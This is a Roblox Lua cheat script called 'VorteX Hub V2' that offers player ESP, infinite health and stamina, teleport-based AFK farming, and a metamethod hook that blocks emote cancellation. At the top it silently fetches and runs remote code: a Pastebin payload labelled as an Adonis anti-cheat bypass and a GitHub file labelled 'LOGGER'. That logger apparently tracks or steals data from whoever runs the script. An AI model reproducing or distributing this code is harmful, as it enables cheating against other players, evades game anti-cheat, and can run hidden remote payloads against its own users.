if getgenv().VorteXHubV2_Loaded then return end
getgenv().VorteXHubV2_Loaded = true

-- REPLACED: Adonis Anti-Cheat Bypass with your pastebin
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/3G4vviQX"))()
    end)
end)

-- LOGGER - Load from GitHub
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofyBlox/GoofyzRBX/refs/heads/main/rbx.lua"))()
    end)
end)

-- Load UI Library with error handling
local success, Library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/wrexlua/SOLIXHUB/refs/heads/retard/SolixUI.lua"))()
end)

if not success or not Library then
    warn("VorteX Hub: Failed to load UI Library")
    return
end

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Stats = game:GetService("Stats")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

-- Constants - 5 Platforms MALAYO (100 studs apart)
local PLATFORM_POSITIONS = {
    Vector3.new(0, -397.1, 0),
    Vector3.new(100, -397.1, 0),
    Vector3.new(-100, -397.1, 0),
    Vector3.new(0, -397.1, 100),
    Vector3.new(0, -397.1, -100)
}

-- State variables
local afkActive = false
local antiAFKActive = false
local antiAFKLoop = nil
local platforms = {}
local teleportConn = nil
local initialized = false
local currentPlatformIndex = 1

-- ESP Variables
local espEnabled = false
local espDistance = false
local espHighlight = false
local espColor = Color3.fromRGB(255, 0, 0)
local espObjects = {}
local espLoop = nil
local highlightObjects = {}

-- Infinite Stamina & Health Variables
local infiniteStamina = false
local infiniteHealth = false
local staminaLoop = nil
local healthLoop = nil

-- FPS & Ping Variables
local fpsValue = 0
local pingValue = 0
local fpsLabel = nil
local pingLabel = nil

-- Create Window - V2
local Window
local success2, err = pcall(function()
    Window = Library:Window({
        Name = "VorteX Hub V2",
        Size = UDim2.new(0, 500, 0, 380),
        FadeSpeed = 0.25
    })
end)

if not success2 then
    warn("VorteX Hub: Failed to create window - " .. tostring(err))
    return
end

pcall(function()
    Window:SetPosition(UDim2.new(0.5, -250, 0.5, -190))
end)

task.wait(0.5)

-- Hide search boxes from other UIs
pcall(function()
    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui.Name:find("SOLIXHUB") or gui.Name:find("UI") then
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("TextBox") and obj.PlaceholderText and obj.PlaceholderText:find("Search") then
                    obj.Visible = false
                    if obj.Parent and obj.Parent:IsA("Frame") then
                        obj.Parent.Visible = false
                    end
                end
            end
        end
    end
end)

-- Helper Functions
local function getGameName()
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    return success and info.Name or game.Name
end

local function getCharacter()
    return LocalPlayer.Character
end

local function getHumanoid()
    local char = getCharacter()
    return char and char:FindFirstChild("Humanoid")
end

local function getRootPart()
    local char = getCharacter()
    return char and char:FindFirstChild("HumanoidRootPart")
end

-- Frosted Glass Blur Functions
local blurGui = nil
local lightingBlur = nil

local function createBlurGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "VorteXFrostedGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999
    
    local root = Instance.new("Frame")
    root.Name = "Root"
    root.Size = UDim2.fromScale(1, 1)
    root.Position = UDim2.fromScale(0, 0)
    root.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    root.BackgroundTransparency = 0.35
    root.BorderSizePixel = 0
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 210)),
    })
    gradient.Transparency = NumberSequence.new(0.9)
    gradient.Rotation = 45
    gradient.Parent = root
    
    root.Parent = screenGui
    return screenGui
end

local function enableBlur()
    if not lightingBlur then
        pcall(function()
            Lighting.Technology = Enum.Technology.ShadowMap
            local blur = Instance.new("BlurEffect")
            blur.Name = "VorteXFullscreenBlur"
            blur.Size = 24
            blur.Parent = Lighting
            lightingBlur = blur
        end)
    end
    
    if not blurGui then
        pcall(function()
            local existing = LocalPlayer.PlayerGui:FindFirstChild("VorteXFrostedGui")
            if existing then
                existing:Destroy()
            end
            blurGui = createBlurGui()
            blurGui.Parent = LocalPlayer.PlayerGui
        end)
    end
end

local function disableBlur()
    pcall(function()
        if blurGui then
            blurGui:Destroy()
            blurGui = nil
        end
        local existing = LocalPlayer.PlayerGui:FindFirstChild("VorteXFrostedGui")
        if existing then
            existing:Destroy()
        end
    end)
    
    pcall(function()
        if lightingBlur then
            lightingBlur:Destroy()
            lightingBlur = nil
        end
        local blur = Lighting:FindFirstChild("VorteXFullscreenBlur")
        if blur then
            blur:Destroy()
        end
    end)
end

-- ESP Functions
local function createESP(player)
    if player == LocalPlayer then return end
    
    local distanceText = Drawing.new("Text")
    distanceText.Visible = false
    distanceText.Color = Color3.fromRGB(200, 200, 200)
    distanceText.Size = 14
    distanceText.Center = true
    distanceText.Outline = true
    
    espObjects[player] = {
        Distance = distanceText
    }
end

local function removeESP(player)
    local objects = espObjects[player]
    if not objects then return end
    
    if objects.Distance then
        objects.Distance:Remove()
    end
    
    espObjects[player] = nil
end

local function createHighlight(player)
    if player == LocalPlayer then return end
    if highlightObjects[player] then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Name = "VorteXESP"
    highlight.FillColor = espColor
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.5
    highlight.OutlineTransparency = 0
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Enabled = false
    
    highlightObjects[player] = highlight
    
    local function onCharacterAdded(char)
        highlight.Adornee = char
        highlight.Parent = char
        highlight.Enabled = espHighlight and espEnabled
    end
    
    player.CharacterAdded:Connect(onCharacterAdded)
    
    if player.Character then
        onCharacterAdded(player.Character)
    end
end

local function removeHighlight(player)
    local highlight = highlightObjects[player]
    if highlight then
        highlight:Destroy()
        highlightObjects[player] = nil
    end
end

local function updateHighlights()
    for player, highlight in pairs(highlightObjects) do
        if highlight and highlight.Parent then
            highlight.Enabled = espHighlight and espEnabled
            highlight.FillColor = espColor
        end
    end
end

local function startESP()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            createESP(player)
            createHighlight(player)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            createESP(player)
            createHighlight(player)
        end
    end)
    
    Players.PlayerRemoving:Connect(function(player)
        removeESP(player)
        removeHighlight(player)
    end)
    
    espLoop = RunService.RenderStepped:Connect(function()
        if not espEnabled then
            for _, objects in pairs(espObjects) do
                if objects.Distance then
                    objects.Distance.Visible = false
                end
            end
            updateHighlights()
            return
        end
        
        updateHighlights()
        
        for player, objects in pairs(espObjects) do
            if not espDistance then
                objects.Distance.Visible = false
                continue
            end
            
            local character = player.Character
            if not character then
                objects.Distance.Visible = false
                continue
            end
            
            local humanoid = character:FindFirstChild("Humanoid")
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            
            if not humanoid or not rootPart or humanoid.Health <= 0 then
                objects.Distance.Visible = false
                continue
            end
            
            local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(rootPart.Position)
            if not onScreen then
                objects.Distance.Visible = false
                continue
            end
            
            local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local distance = localRoot and (localRoot.Position - rootPart.Position).Magnitude or 0
            
            objects.Distance.Position = Vector2.new(pos.X, pos.Y)
            objects.Distance.Text = math.floor(distance) .. " studs"
            objects.Distance.Visible = true
        end
    end)
end

local function stopESP()
    if espLoop then
        espLoop:Disconnect()
        espLoop = nil
    end
    
    for _, objects in pairs(espObjects) do
        if objects.Distance then
            objects.Distance.Visible = false
        end
    end
    
    for _, highlight in pairs(highlightObjects) do
        if highlight then
            highlight.Enabled = false
        end
    end
end

-- Infinite Stamina Function
local function startInfiniteStamina()
    if staminaLoop then return end
    
    local success, result = pcall(function()
        local stamina = require(ReplicatedStorage.Resources.Client.MovementHandler.Stamina)
        local cd = false
        
        staminaLoop = task.spawn(function()
            while infiniteStamina do
                task.wait(0.1)
                if stamina.Get() <= 100 and not cd then
                    cd = true
                    stamina.DrainStamina(-100, 0, true)
                    stamina.DestroyDrainer("BaseDrain")
                    task.wait(1)
                    cd = false
                end
            end
        end)
    end)
    
    if not success then
        warn("Infinite Stamina failed to start: " .. tostring(result))
    end
end

local function stopInfiniteStamina()
    infiniteStamina = false
    if staminaLoop then
        task.cancel(staminaLoop)
        staminaLoop = nil
    end
end

-- Infinite Health Function
local function startInfiniteHealth()
    if healthLoop then return end
    
    healthLoop = task.spawn(function()
        while infiniteHealth do
            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    if hum.MaxHealth ~= 1000 then
                        hum.MaxHealth = 1000
                    end
                    if hum.Health < 1000 then
                        hum.Health = 1000
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end

local function stopInfiniteHealth()
    infiniteHealth = false
    if healthLoop then
        task.cancel(healthLoop)
        healthLoop = nil
    end
end

-- Create 5 Platforms (MALAYO)
local function createPlatforms()
    for _, p in ipairs(platforms) do
        pcall(function() p:Destroy() end)
    end
    platforms = {}
    
    for i, pos in ipairs(PLATFORM_POSITIONS) do
        local success, newPlatform = pcall(function()
            local p = Instance.new("Part")
            p.Name = "AFKPlatform_" .. i
            p.Size = Vector3.new(8, 0.5, 8)
            p.Position = pos - Vector3.new(0, 0.5, 0)
            p.Anchored = true
            p.CanCollide = true
            p.Transparency = 0.3
            p.BrickColor = BrickColor.new("Bright blue")
            p.Material = Enum.Material.Glass
            p.Parent = workspace
            
            local glow = Instance.new("SelectionBox")
            glow.Adornee = p
            glow.Color3 = Color3.fromRGB(0, 200, 255)
            glow.Transparency = 0.6
            glow.LineThickness = 0.1
            glow.Parent = p
            
            return p
        end)
        
        if success then
            table.insert(platforms, newPlatform)
        end
    end
    
    return platforms
end

local function teleportToPlatform(index)
    local hrp = getRootPart()
    if hrp and PLATFORM_POSITIONS[index] then
        pcall(function()
            hrp.CFrame = CFrame.new(PLATFORM_POSITIONS[index])
        end)
    end
end

-- EMOTE ANTI-AFK
local Synchronous = game:GetService("ReplicatedStorage").Communication.EventObjects.Synchronous
local cancelBlocked = false
local emoteHook = false

local function setupEmoteHook()
    if emoteHook then return end
    emoteHook = true
    
    local old; old = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        local args = { ... }
        if cancelBlocked and self == Synchronous and method == "InvokeServer" and args[1] == "CancelEmote" then
            return nil
        end
        return old(self, ...)
    end)
end

local function startAntiAFKLoop()
    if antiAFKLoop then return end
    
    setupEmoteHook()
    cancelBlocked = true
    
    antiAFKLoop = task.spawn(function()
        while antiAFKActive do
            pcall(function()
                Synchronous:InvokeServer("TryEmote", "ChillSit")
            end)
            task.wait(30)
        end
    end)
end

local function stopAntiAFKLoop()
    antiAFKActive = false
    cancelBlocked = false
    if antiAFKLoop then
        task.cancel(antiAFKLoop)
        antiAFKLoop = nil
    end
end

-- AFK Toggle with 5 platforms, frosted blur, and 5-second teleport cycle
local function toggleAFK(state)
    afkActive = state
    
    if state then
        enableBlur()
        createPlatforms()
        currentPlatformIndex = 1
        teleportToPlatform(1)
        
        if teleportConn then
            pcall(function() teleportConn:Disconnect() end)
            teleportConn = nil
        end
        
        local lastTeleport = tick()
        teleportConn = RunService.Heartbeat:Connect(function()
            if not afkActive then return end
            
            local now = tick()
            if now - lastTeleport >= 5 then
                lastTeleport = now
                currentPlatformIndex = currentPlatformIndex + 1
                if currentPlatformIndex > #PLATFORM_POSITIONS then
                    currentPlatformIndex = 1
                end
                teleportToPlatform(currentPlatformIndex)
            end
            
            local hrp = getRootPart()
            if hrp then
                local targetPos = PLATFORM_POSITIONS[currentPlatformIndex]
                local distance = (hrp.Position - targetPos).Magnitude
                if distance > 10 then
                    teleportToPlatform(currentPlatformIndex)
                end
            end
        end)
        
        if initialized then
            Library:Notification("AFK Farm", "Enabled", 3)
        end
    else
        disableBlur()
        
        if teleportConn then
            pcall(function() teleportConn:Disconnect() end)
            teleportConn = nil
        end
        
        for _, p in ipairs(platforms) do
            pcall(function() p:Destroy() end)
        end
        platforms = {}
        
        if initialized then
            Library:Notification("AFK Farm", "Disabled", 3)
        end
    end
end

local function toggleAntiAFK(state)
    antiAFKActive = state
    
    if state then
        startAntiAFKLoop()
        if initialized then
            Library:Notification("Anti AFK", "Enabled", 3)
        end
    else
        stopAntiAFKLoop()
        if initialized then
            Library:Notification("Anti AFK", "Disabled", 3)
        end
    end
end

-- FPS Counter
task.spawn(function()
    local lastUpdate = tick()
    local frames = 0
    
    RunService.RenderStepped:Connect(function()
        frames = frames + 1
        local now = tick()
        if now - lastUpdate >= 1 then
            fpsValue = frames
            frames = 0
            lastUpdate = now
            
            if fpsLabel then
                pcall(function()
                    fpsLabel:SetText("FPS: " .. fpsValue)
                end)
            end
        end
    end)
end)

-- Ping Updater
task.spawn(function()
    while task.wait(2) do
        pcall(function()
            local ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
            pingValue = math.floor(ping)
            
            if pingLabel then
                pcall(function()
                    pingLabel:SetText("Ping: " .. pingValue .. " ms")
                end)
            end
        end)
    end
end)

-- Info Page
local InfoPage = Window:Page({
    Name = "Info",
    Columns = 2
})

local GameSection = InfoPage:Section({
    Name = "Game Info",
    Side = 1
})

pcall(function()
    GameSection:Label("Game: " .. getGameName())
    GameSection:Label("Game ID: " .. game.GameId)
    GameSection:Label("Place ID: " .. game.PlaceId)
    GameSection:Label("Players: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers)
end)

local SystemSection = InfoPage:Section({
    Name = "System Info",
    Side = 1
})

pcall(function()
    fpsLabel = SystemSection:Label("FPS: 0")
    pingLabel = SystemSection:Label("Ping: 0 ms")
end)

local PlayerSection = InfoPage:Section({
    Name = "Player Info",
    Side = 2
})

pcall(function()
    PlayerSection:Label("Name: " .. LocalPlayer.Name)
    PlayerSection:Label("Display: " .. LocalPlayer.DisplayName)
    PlayerSection:Label("User ID: " .. LocalPlayer.UserId)
    PlayerSection:Label("Account Age: " .. LocalPlayer.AccountAge .. " days")
    PlayerSection:Label("")
    PlayerSection:Label("Created by: Goofyz | RBX")
end)

local ScriptSection = InfoPage:Section({
    Name = "Script Info",
    Side = 2
})

pcall(function()
    local executor = "Unknown"
    pcall(function()
        executor = identifyexecutor()
    end)
    
    ScriptSection:Label("Name: VorteX Hub")
    ScriptSection:Label("Version: 2.0 BETA")
    ScriptSection:Label("Executor: " .. executor)
    ScriptSection:Label("Status: Ready")
end)

-- Main Page
local MainPage = Window:Page({
    Name = "Main",
    Columns = 1
})

local AFKSection = MainPage:Section({
    Name = "AFK Farm",
    Side = 1
})

pcall(function()
    AFKSection:Toggle({
        Name = "Enable AFK Farm",
        Flag = "AFKToggle",
        Default = false,
        Callback = function(Value)
            toggleAFK(Value)
        end
    })
    AFKSection:Label("Teleports to safe platform and stays there.")
end)

local AntiAFKSection = MainPage:Section({
    Name = "Anti AFK",
    Side = 1
})

pcall(function()
    AntiAFKSection:Toggle({
        Name = "Enable Anti AFK",
        Flag = "AntiAFKToggle",
        Default = false,
        Callback = function(Value)
            toggleAntiAFK(Value)
        end
    })
    AntiAFKSection:Label("Prevents idle kick")
end)

-- Player Page
local PlayerPage = Window:Page({
    Name = "Player",
    Columns = 2
})

local ESPSection = PlayerPage:Section({
    Name = "ESP",
    Side = 1
})

pcall(function()
    ESPSection:Toggle({
        Name = "Enable ESP",
        Flag = "ESPEnabled",
        Default = false,
        Callback = function(Value)
            espEnabled = Value
            if Value and initialized then
                startESP()
                Library:Notification("ESP", "Enabled", 3)
            elseif not Value then
                stopESP()
                if initialized then
                    Library:Notification("ESP", "Disabled", 3)
                end
            end
        end
    })
    
    ESPSection:Toggle({
        Name = "Highlight",
        Flag = "ESPHighlight",
        Default = false,
        Callback = function(Value)
            espHighlight = Value
        end
    })
    
    ESPSection:Toggle({
        Name = "Distance",
        Flag = "ESPDistance",
        Default = false,
        Callback = function(Value)
            espDistance = Value
        end
    })
end)

local ModsSection = PlayerPage:Section({
    Name = "Player Mods",
    Side = 2
})

pcall(function()
    ModsSection:Toggle({
        Name = "Infinite Stamina",
        Flag = "InfStaminaV3",
        Default = false,
        Callback = function(Value)
            if not initialized then
                infiniteStamina = false
                return
            end
            
            infiniteStamina = Value
            
            if Value then
                startInfiniteStamina()
                Library:Notification("Infinite Stamina", "Enabled", 3)
            else
                stopInfiniteStamina()
                Library:Notification("Infinite Stamina", "Disabled", 3)
            end
        end
    })
    
    ModsSection:Label("Refills stamina automatically")
    
    ModsSection:Toggle({
        Name = "Infinite Health",
        Flag = "InfHealthV1",
        Default = false,
        Callback = function(Value)
            if not initialized then
                infiniteHealth = false
                return
            end
            
            infiniteHealth = Value
            
            if Value then
                startInfiniteHealth()
                Library:Notification("Infinite Health", "Enabled", 3)
            else
                stopInfiniteHealth()
                Library:Notification("Infinite Health", "Disabled", 3)
            end
        end
    })
    
    ModsSection:Label("Auto-heals to full health")
end)

task.delay(0.1, function()
    initialized = true
end)

task.delay(1, function()
    pcall(function()
        Library:Notification("VorteX Hub V2", "Loaded successfully!", 5)
    end)
end)
